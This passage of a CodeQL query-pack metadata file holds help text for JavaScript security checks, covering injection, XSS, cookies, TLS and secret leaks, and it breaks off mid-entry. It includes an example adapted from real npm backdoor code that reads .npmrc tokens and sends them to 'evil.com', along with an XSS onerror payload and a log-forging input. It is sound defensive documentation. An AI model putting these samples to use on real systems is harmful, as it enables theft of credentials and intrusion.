      For example, assume that we want to embed a user-controlled string `accountNumber` into a SQL query as part of a string literal. To avoid SQL injection, we need to ensure that the string does not contain un-escaped single-quote characters. The following function attempts to ensure this by doubling single quotes, and thereby escaping them:


      ```javascript
      function escapeQuotes(s) {
        return s.replace("'", "''");
      }

      ```
      As written, this sanitizer is ineffective: if the first argument to `replace` is a string literal (as in this case), only the *first* occurrence of that string is replaced.

      As mentioned above, the function `escapeQuotes` should be replaced with a purpose-built sanitization library, such as the npm module `sqlstring`. Many other sanitization libraries are available from npm and other sources.

      If this is not an option, `escapeQuotes` should be rewritten to use a regular expression with the `g` ("global") flag instead:


      ```javascript
      function escapeQuotes(s) {
        return s.replace(/'/g, "''");
      }

      ```
      Note that it is very important to include the global flag: `s.replace(/'/, "''")` *without* the global flag is equivalent to the first example above and only replaces the first quote.


      ## References
      * OWASP Top 10: [A1 Injection](https://www.owasp.org/index.php/Top_10-2017_A1-Injection).
      * npm: [sqlstring](https://www.npmjs.com/package/sqlstring) package.
      * Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).
      * Common Weakness Enumeration: [CWE-80](https://cwe.mitre.org/data/definitions/80.html).
      * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-116/UnsafeHtmlExpansion.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-116/UnsafeHtmlExpansion.bqrs
    metadata:
      name: Unsafe expansion of self-closing HTML tag
      description: |-
        Using regular expressions to expand self-closing HTML
                      tags may lead to cross-site scripting vulnerabilities.
      kind: problem
      problem.severity: warning
      security-severity: 6.1
      precision: very-high
      id: js/unsafe-html-expansion
      tags: |-
        correctness
               security
               external/cwe/cwe-079
               external/cwe/cwe-116
    queryHelp:
      "# Unsafe expansion of self-closing HTML tag\nSanitizing untrusted input\
      \ for HTML meta-characters is a common technique for preventing cross-site scripting\
      \ attacks. But even a sanitized input can be dangerous to use if it is modified\
      \ further before a browser treats it as HTML. A seemingly innocent transformation\
      \ that expands a self-closing HTML tag from `<div attr=\"{sanitized}\"/>` to `<div\
      \ attr=\"{sanitized}\"></div>` may in fact cause cross-site scripting vulnerabilities.\n\
      \n\n## Recommendation\nUse a well-tested sanitization library if at all possible,\
      \ and avoid modifying sanitized values further before treating them as HTML.\n\
      \nAn even safer alternative is to design the application so that sanitization\
      \ is not needed, for instance by using HTML templates that are explicit about\
      \ the values they treat as HTML.\n\n\n## Example\nThe following function transforms\
      \ a self-closing HTML tag to a pair of open/close tags. It does so for all non-`img`\
      \ and non-`area` tags, by using a regular expression with two capture groups.\
      \ The first capture group corresponds to the name of the tag, and the second capture\
      \ group to the content of the tag.\n\n\n```javascript\nfunction expandSelfClosingTags(html)\
      \ {\n\tvar rxhtmlTag = /<(?!img|area)(([a-z][^\\w\\/>]*)[^>]*)\\/>/gi;\n\treturn\
      \ html.replace(rxhtmlTag, \"<$1></$2>\"); // BAD\n}\n\n```\nWhile it is generally\
      \ known regular expressions are ill-suited for parsing HTML, variants of this\
      \ particular transformation pattern have long been considered safe.\n\nHowever,\
      \ the function is not safe. As an example, consider the following string:\n\n\n\
      ```html\n<div alt=\"\n<x\" title=\"/>\n<img src=url404 onerror=alert(1)>\"/>\n\
      \n```\nWhen the above function transforms the string, it becomes a string that\
      \ results in an alert when a browser treats it as HTML.\n\n\n```html\n<div alt=\"\
      \n<x\" title=\"></x\" >\n<img src=url404 onerror=alert(1)>\"/>\n\n```\n\n## References\n\
      * jQuery: [Security fixes in jQuery 3.5.0](https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/)\n\
      * OWASP: [DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).\n\
      * OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).\n\
      * OWASP [Types of Cross-Site](https://owasp.org/www-community/Types_of_Cross-Site_Scripting).\n\
      * Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).\n\
      * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n\
      * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-117/LogInjection.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-117/LogInjection.bqrs
    metadata:
      name: Log injection
      description: |-
        Building log entries from user-controlled sources is vulnerable to
                      insertion of forged log entries by a malicious user.
      kind: path-problem
      problem.severity: error
      security-severity: 6.1
      precision: medium
      id: js/log-injection
      tags: |-
        security
               external/cwe/cwe-117
    queryHelp: |
      # Log injection
      If unsanitized user input is written to a log entry, a malicious user may be able to forge new log entries.

      Forgery can occur if a user provides some input with characters that are interpreted when the log output is displayed. If the log is displayed as a plain text file, then new line characters can be used by a malicious user. If the log is displayed as HTML, then arbitrary HTML may be included to spoof log entries.


      ## Recommendation
      User input should be suitably sanitized before it is logged.

      If the log entries are in plain text then line breaks should be removed from user input, using `String.prototype.replace` or similar. Care should also be taken that user input is clearly marked in log entries.

      For log entries that will be displayed in HTML, user input should be HTML-encoded before being logged, to prevent forgery and other forms of HTML injection.


      ## Example
      In the first example, a username, provided by the user, is logged using \`console.info\`. In the first case, it is logged without any sanitization. In the second case, the username is used to build an error that is logged using \`console.error\`. If a malicious user provides \`username=Guest%0a\[INFO\]+User:+Admin%0a\` as a username parameter, the log entry will be splitted in two different lines, where the second line will be \`\[INFO\]+User:+Admin\`.


      ```javascript
      const http = require('http');
      const url = require('url');

      const server = http.createServer((req, res) => {
          let q = url.parse(req.url, true);

          console.info(`[INFO] User: ${q.query.username}`); // BAD: User input logged as-is
      })

      server.listen(3000, '127.0.0.1', () => {});

      ```
      In the second example, `String.prototype.replace` is used to ensure no line endings are present in the user input.


      ```javascript
      const http = require('http');
      const url = require('url');

      const server = http.createServer((req, res) => {
          let q = url.parse(req.url, true);

          // GOOD: remove newlines from user controlled input before logging
          let username = q.query.username.replace(/\n|\r/g, "");

          console.info(`[INFO] User: ${username}`);
      });

      server.listen(3000, '127.0.0.1', () => {});

      ```

      ## References
      * OWASP: [Log Injection](https://www.owasp.org/index.php/Log_Injection).
      * Common Weakness Enumeration: [CWE-117](https://cwe.mitre.org/data/definitions/117.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-1275/SameSiteNoneCookie.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-1275/SameSiteNoneCookie.bqrs
    metadata:
      name: Sensitive cookie without SameSite restrictions
      description: |-
        Sensitive cookies where the SameSite attribute is set to "None" can
                      in some cases allow for Cross-Site Request Forgery (CSRF) attacks.
      kind: problem
      problem.severity: warning
      security-severity: 5.0
      precision: medium
      id: js/samesite-none-cookie
      tags: |-
        security
               external/cwe/cwe-1275
    queryHelp: |
      # Sensitive cookie without SameSite restrictions
      Authentication cookies where the SameSite attribute is set to "None" can potentially be used to perform Cross-Site Request Forgery (CSRF) attacks if no other CSRF protections are in place.

      With SameSite set to "None", a third party website may create an authorized cross-site request that includes the cookie. Such a cross-site request can allow that website to perform actions on behalf of a user.


      ## Recommendation
      Set the `SameSite` attribute to `Strict` on all sensitive cookies.


      ## Example
      The following example stores an authentication token in a cookie where the `SameSite` attribute is set to `None`.


      ```javascript
      const http = require('http');

      const server = http.createServer((req, res) => {
          res.setHeader("Set-Cookie", `authKey=${makeAuthkey()}; secure; httpOnly; SameSite=None`);
          res.writeHead(200, { 'Content-Type': 'text/html' });
          res.end('<h2>Hello world</h2>');
      });
      ```
      To prevent the cookie from being included in cross-site requests, set the `SameSite` attribute to `Strict`.


      ```javascript
      const http = require('http');

      const server = http.createServer((req, res) => {
          res.setHeader("Set-Cookie", `authKey=${makeAuthkey()}; secure; httpOnly; SameSite=Strict`);
          res.writeHead(200, { 'Content-Type': 'text/html' });
          res.end('<h2>Hello world</h2>');
      });
      ```

      ## References
      * MDN Web Docs: [SameSite cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite).
      * OWASP: [SameSite](https://owasp.org/www-community/SameSite).
      * Common Weakness Enumeration: [CWE-1275](https://cwe.mitre.org/data/definitions/1275.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-134/TaintedFormatString.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-134/TaintedFormatString.bqrs
    metadata:
      name: Use of externally-controlled format string
      description: Using external input in format strings can lead to garbled output.
      kind: path-problem
      problem.severity: warning
      security-severity: 7.3
      precision: high
      id: js/tainted-format-string
      tags: |-
        security
               external/cwe/cwe-134
    queryHelp: |
      # Use of externally-controlled format string
      Functions like the Node.js standard library function `util.format` accept a format string that is used to format the remaining arguments by providing inline format specifiers. If the format string contains unsanitized input from an untrusted source, then that string may contain unexpected format specifiers that cause garbled output.


      ## Recommendation
      Either sanitize the input before including it in the format string, or use a `%s` specifier in the format string, and pass the untrusted data as corresponding argument.


      ## Example
      The following program snippet logs information about an unauthorized access attempt. The log message includes the user name, and the user's IP address is passed as an additional argument to `console.log` to be appended to the message:


      ```javascript
      const app = require("express")();

      app.get("unauthorized", function handler(req, res) {
        let user = req.query.user;
        let ip = req.connection.remoteAddress;
        console.log("Unauthorized access attempt by " + user, ip);
      });

      ```
      However, if a malicious user provides `%d` as their user name, `console.log` will instead attempt to format the `ip` argument as a number. Since IP addresses are not valid numbers, the result of this conversion is `NaN`. The resulting log message will read "Unauthorized access attempt by NaN", missing all the information that it was trying to log in the first place.

      Instead, the user name should be included using the `%s` specifier:


      ```javascript
      const app = require("express")();

      app.get("unauthorized", function handler(req, res) {
        let user = req.query.user;
        let ip = req.connection.remoteAddress;
        console.log("Unauthorized access attempt by %s", user, ip);
      });

      ```

      ## References
      * Node.js Documentation: [util.format](https://nodejs.org/api/util.html#util_util_format_format_args).
      * Common Weakness Enumeration: [CWE-134](https://cwe.mitre.org/data/definitions/134.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-178/CaseSensitiveMiddlewarePath.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-178/CaseSensitiveMiddlewarePath.bqrs
    metadata:
      name: Case-sensitive middleware path
      description:
        Middleware with case-sensitive paths do not protect endpoints with
        case-insensitive paths.
      kind: problem
      problem.severity: warning
      security-severity: 7.3
      precision: high
      id: js/case-sensitive-middleware-path
      tags: |-
        security
               external/cwe/cwe-178
    queryHelp: |
      # Case-sensitive middleware path
      Using a case-sensitive regular expression path in a middleware route enables an attacker to bypass that middleware when accessing an endpoint with a case-insensitive path. Paths specified using a string are case-insensitive, whereas regular expressions are case-sensitive by default.


      ## Recommendation
      When using a regular expression as a middleware path, make sure the regular expression is case-insensitive by adding the `i` flag.


      ## Example
      The following example restricts access to paths in the `/admin` path to users logged in as administrators:


      ```javascript
      const app = require('express')();

      app.use(/\/admin\/.*/, (req, res, next) => {
          if (!req.user.isAdmin) {
              res.status(401).send('Unauthorized');
          } else {
              next();
          }
      });

      app.get('/admin/users/:id', (req, res) => {
          res.send(app.database.users[req.params.id]);
      });

      ```
      A path such as `/admin/users/45` can only be accessed by an administrator. However, the path `/ADMIN/USERS/45` can be accessed by anyone because the upper-case path doesn't match the case-sensitive regular expression, whereas Express considers it to match the path string `/admin/users`.

      The issue can be fixed by adding the `i` flag to the regular expression:


      ```javascript
      const app = require('express')();

      app.use(/\/admin\/.*/i, (req, res, next) => {
          if (!req.user.isAdmin) {
              res.status(401).send('Unauthorized');
          } else {
              next();
          }
      });

      app.get('/admin/users/:id', (req, res) => {
          res.send(app.database.users[req.params.id]);
      });

      ```

      ## References
      * MDN [Regular Expression Flags](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions#advanced_searching_with_flags).
      * Common Weakness Enumeration: [CWE-178](https://cwe.mitre.org/data/definitions/178.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-200/FileAccessToHttp.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-200/FileAccessToHttp.bqrs
    metadata:
      name: File data in outbound network request
      description:
        Directly sending file data in an outbound network request can indicate
        unauthorized information disclosure.
      kind: path-problem
      problem.severity: warning
      security-severity: 6.5
      precision: medium
      id: js/file-access-to-http
      tags: |-
        security
               external/cwe/cwe-200
    queryHelp: |
      # File data in outbound network request
      Sending local file system data to a remote URL without further validation risks uncontrolled information exposure, and may be an indication of malicious backdoor code that has been implanted into an otherwise trusted code base.


      ## Recommendation
      Examine the highlighted code closely to ensure that it is behaving as intended.


      ## Example
      The following example is adapted from backdoor code that was identified in two popular npm packages. It reads the contents of the `.npmrc` file (which may contain secret npm tokens) and sends it to a remote server by embedding it into an HTTP request header.


      ```javascript
      var fs = require("fs"),
          https = require("https");

      var content = fs.readFileSync(".npmrc", "utf8");
      https.get({
        hostname: "evil.com",
        path: "/upload",
        method: "GET",
        headers: { Referer: content }
      }, () => { });

      ```

      ## References
      * ESLint Blog: [Postmortem for Malicious Packages Published on July 12th, 2018](https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes).
      * OWASP: [Sensitive Data Exposure](https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure).
      * OWASP: [Trojan Horse](https://www.owasp.org/index.php/Trojan_Horse).
      * Common Weakness Enumeration: [CWE-200](https://cwe.mitre.org/data/definitions/200.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-200/PrivateFileExposure.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-200/PrivateFileExposure.bqrs
    metadata:
      name: Exposure of private files
      description: |-
        Exposing a node_modules folder, or the project folder to the public, can cause exposure
                      of private information.
      kind: problem
      problem.severity: warning
      security-severity: 6.5
      id: js/exposure-of-private-files
      tags: |-
        security
               external/cwe/cwe-200
               external/cwe/cwe-219
               external/cwe/cwe-548
      precision: high
    queryHelp: |
      # Exposure of private files
      Libraries like `express` provide easy methods for serving entire directories of static files from a web server. However, using these can sometimes lead to accidental information exposure. If for example the `node_modules` folder is served, then an attacker can access the `_where` field from a `package.json` file, which gives access to the absolute path of the file.


      ## Recommendation
      Limit which folders of static files are served from a web server.


      ## Example
      In the example below, all the files from the `node_modules` are served. This allows clients to easily access all the files inside that folder, which includes potentially private information inside `package.json` files.


      ```javascript

      var express = require('express');

      var app = express();

      app.use('/node_modules', express.static(path.resolve(__dirname, '../node_modules')));
      ```
      The issue has been fixed below by only serving specific folders within the `node_modules` folder.


      ```javascript

      var express = require('express');

      var app = express();

      app.use("jquery", express.static('./node_modules/jquery/dist'));
      app.use("bootstrap", express.static('./node_modules/bootstrap/dist'));
      ```

      ## References
      * OWASP: [Sensitive Data Exposure](https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure).
      * Common Weakness Enumeration: [CWE-200](https://cwe.mitre.org/data/definitions/200.html).
      * Common Weakness Enumeration: [CWE-219](https://cwe.mitre.org/data/definitions/219.html).
      * Common Weakness Enumeration: [CWE-548](https://cwe.mitre.org/data/definitions/548.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-201/PostMessageStar.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-201/PostMessageStar.bqrs
    metadata:
      name: Cross-window communication with unrestricted target origin
      description: |-
        When sending sensitive information to another window using `postMessage`,
                      the origin of the target window should be restricted to avoid unintentional
                      information leaks.
      kind: path-problem
      problem.severity: error
      security-severity: 4.3
      precision: high
      id: js/cross-window-information-leak
      tags: |-
        security
               external/cwe/cwe-201
               external/cwe/cwe-359
    queryHelp: |
      # Cross-window communication with unrestricted target origin
      The `window.postMessage` method allows different windows or iframes to communicate directly, even if they were loaded from different origins, circumventing the usual same-origin policy.

      The sender of the message can restrict the origin of the receiver by specifying a target origin. If the receiver window does not come from this origin, the message is not sent.

      Alternatively, the sender can specify a target origin of `'*'`, which means that any origin is acceptable and the message is always sent.

      This feature should not be used if the message being sent contains sensitive data such as user credentials: the target window may have been loaded from a malicious site, to which the data would then become available.


      ## Recommendation
      If possible, specify a target origin when using `window.postMessage`. Alternatively, encrypt the sensitive data before sending it to prevent an unauthorized receiver from accessing it.


      ## Example
      The following example code sends user credentials (in this case, their user name) to `window.parent` without checking its origin. If a malicious site loads the page containing this code into an iframe it would be able to gain access to the user name.


      ```javascript
      window.parent.postMessage(userName, '*');

      ```
      To prevent this from happening, the origin of the target window should be restricted, as in this example:


      ```javascript
      window.parent.postMessage(userName, 'https://github.com');

      ```

      ## References
      * Mozilla Developer Network: [Window.postMessage](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage).
      * Mozilla Developer Network: [Same-origin policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy).
      * Common Weakness Enumeration: [CWE-201](https://cwe.mitre.org/data/definitions/201.html).
      * Common Weakness Enumeration: [CWE-359](https://cwe.mitre.org/data/definitions/359.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-209/StackTraceExposure.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-209/StackTraceExposure.bqrs
    metadata:
      name: Information exposure through a stack trace
      description: |-
        Propagating stack trace information to an external user can
                      unintentionally reveal implementation details that are useful
                      to an attacker for developing a subsequent exploit.
      kind: path-problem
      problem.severity: warning
      security-severity: 5.4
      precision: very-high
      id: js/stack-trace-exposure
      tags: |-
        security
               external/cwe/cwe-209
               external/cwe/cwe-497
    queryHelp: |
      # Information exposure through a stack trace
      Software developers often add stack traces to error messages, as a debugging aid. Whenever that error message occurs for an end user, the developer can use the stack trace to help identify how to fix the problem. In particular, stack traces can tell the developer more about the sequence of events that led to a failure, as opposed to merely the final state of the software when the error occurred.

      Unfortunately, the same information can be useful to an attacker. The sequence of function names in a stack trace can reveal the structure of the application as well as any internal components it relies on. Furthermore, the error message at the top of a stack trace can include information such as server-side file names and SQL code that the application relies on, allowing an attacker to fine-tune a subsequent injection attack.


      ## Recommendation
      Send the user a more generic error message that reveals less information. Either suppress the stack trace entirely, or log it only on the server.


      ## Example
      In the following example, an exception is caught and its stack trace is sent back to the remote user as part of the HTTP response. As such, the user is able to see a detailed stack trace, which may contain sensitive information.


      ```javascript
      var http = require('http');

      http.createServer(function onRequest(req, res) {
        var body;
        try {
          body = handleRequest(req);
        }
        catch (err) {
          res.statusCode = 500;
          res.setHeader("Content-Type", "text/plain");
          res.end(err.stack); // NOT OK
          return;
        }
        res.statusCode = 200;
        res.setHeader("Content-Type", "application/json");
        res.setHeader("Content-Length", body.length);
        res.end(body);
      }).listen(3000);

      ```
      Instead, the stack trace should be logged only on the server. That way, the developers can still access and use the error log, but remote users will not see the information:


      ```javascript
      var http = require('http');

      http.createServer(function onRequest(req, res) {
        var body;
        try {
          body = handleRequest(req);
        }
        catch (err) {
          res.statusCode = 500;
          res.setHeader("Content-Type", "text/plain");
          log("Exception occurred", err.stack);
          res.end("An exception occurred"); // OK
          return;
        }
        res.statusCode = 200;
        res.setHeader("Content-Type", "application/json");
        res.setHeader("Content-Length", body.length);
        res.end(body);
      }).listen(3000);

      ```

      ## References
      * OWASP: [Improper Error Handling](https://owasp.org/www-community/Improper_Error_Handling).
      * Common Weakness Enumeration: [CWE-209](https://cwe.mitre.org/data/definitions/209.html).
      * Common Weakness Enumeration: [CWE-497](https://cwe.mitre.org/data/definitions/497.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-295/DisablingCertificateValidation.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-295/DisablingCertificateValidation.bqrs
    metadata:
      name: Disabling certificate validation
      description:
        Disabling cryptographic certificate validation can cause security
        vulnerabilities.
      kind: problem
      problem.severity: error
      security-severity: 7.5
      precision: very-high
      id: js/disabling-certificate-validation
      tags: |-
        security
               external/cwe/cwe-295
               external/cwe/cwe-297
    queryHelp: |
      # Disabling certificate validation
      Certificate validation is the standard authentication method of a secure TLS connection. Without it, there is no guarantee about who the other party of a TLS connection is, making man-in-the-middle attacks more likely to occur

      When testing software that uses TLS connections, it may be useful to disable the certificate validation temporarily. But disabling it in production environments is strongly discouraged, unless an alternative method of authentication is used.


      ## Recommendation
      Do not disable certificate validation for TLS connections.


      ## Example
      The following example shows a HTTPS connection that transfers confidential information to a remote server. But the connection is not secure since the `rejectUnauthorized` option of the connection is set to `false`. As a consequence, anyone can impersonate the remote server, and receive the confidential information.


      ```javascript
      let https = require("https");

      https.request(
        {
          hostname: "secure.my-online-bank.com",
          port: 443,
          method: "POST",
          path: "send-confidential-information",
          rejectUnauthorized: false // BAD
        },
        response => {
          // ... communicate with secure.my-online-bank.com
        }
      );

      ```
      To make the connection secure, the `rejectUnauthorized` option should have its default value, or be explicitly set to `true`.


      ## References
      * Wikipedia: [Transport Layer Security (TLS)](https://en.wikipedia.org/wiki/Transport_Layer_Security)
      * Wikipedia: [Man-in-the-middle attack](https://en.wikipedia.org/wiki/Man-in-the-middle_attack)
      * Node.js: [TLS (SSL)](https://nodejs.org/api/tls.html)
      * Common Weakness Enumeration: [CWE-295](https://cwe.mitre.org/data/definitions/295.html).
      * Common Weakness Enumeration: [CWE-297](https://cwe.mitre.org/data/definitions/297.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-300/InsecureDependencyResolution.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-300/InsecureDependencyResolution.bqrs
    metadata:
      name: Dependency download using unencrypted communication channel
      description: |-
        Using unencrypted protocols to fetch dependencies can leave an application
                      open to man-in-the-middle attacks.
      kind: problem
      problem.severity: warning
      security-severity: 8.1
      precision: high
      id: js/insecure-dependency
      tags: |-
        security
               external/cwe/cwe-300
               external/cwe/cwe-319
               external/cwe/cwe-494
               external/cwe/cwe-829
    queryHelp: |
      # Dependency download using unencrypted communication channel
      Using an insecure protocol like HTTP or FTP to download build dependencies makes the build process vulnerable to a man-in-the-middle (MITM) attack.

      This can allow attackers to inject malicious code into the downloaded dependencies, and thereby infect the build artifacts and execute arbitrary code on the machine building the artifacts.


      ## Recommendation
      Always use a secure protocol, such as HTTPS or SFTP, when downloading artifacts from an URL.


      ## Example
      The below example shows a `package.json` file that downloads a dependency using the insecure HTTP protocol.


      ```json
      {
        "name": "example-project",
        "dependencies": {
          "unencrypted": "http://example.org/foo/tarball/release/0.0.1",
          "lodash": "^4.0.0"
        }
      }
      ```
      The fix is to change the protocol to HTTPS.


      ```json
      {
        "name": "example-project",
        "dependencies": {
          "unencrypted": "https://example.org/foo/tarball/release/0.0.1",
          "lodash": "^4.0.0"
        }
      }
      ```

      ## References
      * Jonathan Leitschuh: [ Want to take over the Java ecosystem? All you need is a MITM! ](https://infosecwriteups.com/want-to-take-over-the-java-ecosystem-all-you-need-is-a-mitm-1fc329d898fb)
      * Max Veytsman: [ How to take over the computer of any Java (or Closure or Scala) Developer. ](https://max.computer/blog/how-to-take-over-the-computer-of-any-java-or-clojure-or-scala-developer/)
      * Wikipedia: [Supply chain attack.](https://en.wikipedia.org/wiki/Supply_chain_attack)
      * Wikipedia: [Man-in-the-middle attack.](https://en.wikipedia.org/wiki/Man-in-the-middle_attack)
      * Common Weakness Enumeration: [CWE-300](https://cwe.mitre.org/data/definitions/300.html).
      * Common Weakness Enumeration: [CWE-319](https://cwe.mitre.org/data/definitions/319.html).
      * Common Weakness Enumeration: [CWE-494](https://cwe.mitre.org/data/definitions/494.html).
      * Common Weakness Enumeration: [CWE-829](https://cwe.mitre.org/data/definitions/829.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-312/BuildArtifactLeak.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-312/BuildArtifactLeak.bqrs
    metadata:
      name: Storage of sensitive information in build artifact
      description: |-
        Including sensitive information in a build artifact can
                      expose it to an attacker.
      kind: path-problem
      problem.severity: error
      security-severity: 7.5
      precision: high
      id: js/build-artifact-leak
      tags: |-
        security
               external/cwe/cwe-312
               external/cwe/cwe-315
               external/cwe/cwe-359
    queryHelp: |
      # Storage of sensitive information in build artifact
      Sensitive information included in a build artifact can allow an attacker to access the sensitive information if the artifact is published.


      ## Recommendation
      Only store information that is meant to be publicly available in a build artifact.


      ## Example
      The following example creates a `webpack` configuration that inserts all environment variables from the host into the build artifact:


      ```javascript
      const webpack = require("webpack");

      module.exports = [{
          plugins: [
              new webpack.DefinePlugin({
                  "process.env": JSON.stringify(process.env)
              })
          ]
      }];
      ```
      The environment variables might include API keys or other sensitive information, and the build-system should instead insert only the environment variables that are supposed to be public.

      The issue has been fixed below, where only the `DEBUG` environment variable is inserted into the artifact.


      ```javascript
      const webpack = require("webpack");

      module.exports = [{
          plugins: [
              new webpack.DefinePlugin({
                  'process.env': JSON.stringify({ DEBUG: process.env.DEBUG })
              })
          ]
      }];

      ```

      ## References
      * webpack: [DefinePlugin API](https://webpack.js.org/plugins/define-plugin/).
      * Common Weakness Enumeration: [CWE-312](https://cwe.mitre.org/data/definitions/312.html).
      * Common Weakness Enumeration: [CWE-315](https://cwe.mitre.org/data/definitions/315.html).
      * Common Weakness Enumeration: [CWE-359](https://cwe.mitre.org/data/definitions/359.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-312/CleartextLogging.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-312/CleartextLogging.bqrs
    metadata:
      name: Clear-text logging of sensitive information
      description: |-
        Logging sensitive information without encryption or hashing can
                      expose it to an attacker.
      kind: path-problem
      problem.severity: error
      security-severity: 7.5
      precision: high
      id: js/clear-text-logging
      tags: |-
        security
               external/cwe/cwe-312
               external/cwe/cwe-359
               external/cwe/cwe-532
    queryHelp:
      "# Clear-text logging of sensitive information\nIf sensitive data is\
      \ written to a log entry it could be exposed to an attacker who gains access to\
      \ the logs.\n\nPotential attackers can obtain sensitive user data when the log\
      \ output is displayed. Additionally that data may expose system information such\
      \ as full path names, system information, and sometimes usernames and passwords.\n\
      \n\n## Recommendation\nSensitive data should not be logged.\n\n\n## Example\n\
      In the example the entire process environment is logged using \\`console.info\\\
      `. Regular users of the production deployed application should not have access\
      \ to this much information about the environment configuration.\n\n\n```javascript\n\
      // BAD: Logging cleartext sensitive data\nconsole.info(`[INFO] Environment: ${JSON.stringify(process.env)}`);\n\
      \n```\nIn the second example the data that is logged is not sensitive.\n\n\n```javascript\n\
      let not_sensitive_data = { a: 1, b : 2} \n// GOOD: it is fine to log data that\
      \ is not sensitive\nconsole.info(`[INFO] Some object contains: ${JSON.stringify(not_sensitive_data)}`);\n\
      ```\n\n## References\n* OWASP: [Insertion of Sensitive Information into Log File](https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/).\n\
      * Common Weakness Enumeration: [CWE-312](https://cwe.mitre.org/data/definitions/312.html).\n\
      * Common Weakness Enumeration: [CWE-359](https://cwe.mitre.org/data/definitions/359.html).\n\
      * Common Weakness Enumeration: [CWE-532](https://cwe.mitre.org/data/definitions/532.html).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-312/CleartextStorage.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-312/CleartextStorage.bqrs
    metadata:
      name: Clear text storage of sensitive information
      description: |-
        Sensitive information stored without encryption or hashing can expose it to an
                      attacker.
      kind: path-problem
      problem.severity: error
      security-severity: 7.5
      precision: high
      id: js/clear-text-storage-of-sensitive-data
      tags: |-
        security
               external/cwe/cwe-312
               external/cwe/cwe-315
               external/cwe/cwe-359
    queryHelp: |
      # Clear text storage of sensitive information
      Sensitive information that is stored unencrypted is accessible to an attacker who gains access to the storage. This is particularly important for cookies, which are stored on the machine of the end-user.


      ## Recommendation
      Ensure that sensitive information is always encrypted before being stored. If possible, avoid placing sensitive information in cookies altogether. Instead, prefer storing, in the cookie, a key that can be used to look up the sensitive information.

      In general, decrypt sensitive information only at the point where it is necessary for it to be used in cleartext.

      Be aware that external processes often store the `standard out` and `standard error` streams of the application, causing logged sensitive information to be stored as well.


      ## Example
      The following example code stores user credentials (in this case, their password) in a cookie in plain text:


      ```javascript
      var express = require('express');

      var app = express();
      app.get('/remember-password', function (req, res) {
        let pw = req.param("current_password");
        // BAD: Setting a cookie value with cleartext sensitive data.
        res.cookie("password", pw);
      });

      ```
      Instead, the credentials should be encrypted, for instance by using the Node.js `crypto` module:


      ```javascript
      var express = require('express');
      var crypto = require('crypto'),
          password = getPassword();

      function encrypt(text){
        var cipher = crypto.createCipher('aes-256-ctr', password);
        return cipher.update(text, 'utf8', 'hex') + cipher.final('hex');
      }

      var app = express();
      app.get('/remember-password', function (req, res) {
        let pw = req.param("current_password");
        // GOOD: Encoding the value before setting it.
        res.cookie("password", encrypt(pw));
      });

      ```

      ## References
      * M. Dowd, J. McDonald and J. Schuhm, *The Art of Software Security Assessment*, 1st Edition, Chapter 2 - 'Common Vulnerabilities of Encryption', p. 43. Addison Wesley, 2006.
      * M. Howard and D. LeBlanc, *Writing Secure Code*, 2nd Edition, Chapter 9 - 'Protecting Secret Data', p. 299. Microsoft, 2002.
      * Common Weakness Enumeration: [CWE-312](https://cwe.mitre.org/data/definitions/312.html).
      * Common Weakness Enumeration: [CWE-315](https://cwe.mitre.org/data/definitions/315.html).
      * Common Weakness Enumeration: [CWE-359](https://cwe.mitre.org/data/definitions/359.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-313/PasswordInConfigurationFile.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-313/PasswordInConfigurationFile.bqrs
    metadata:
      name: Password in configuration file
      description: Storing unencrypted passwords in configuration files is unsafe.
      kind: problem
      problem.severity: warning
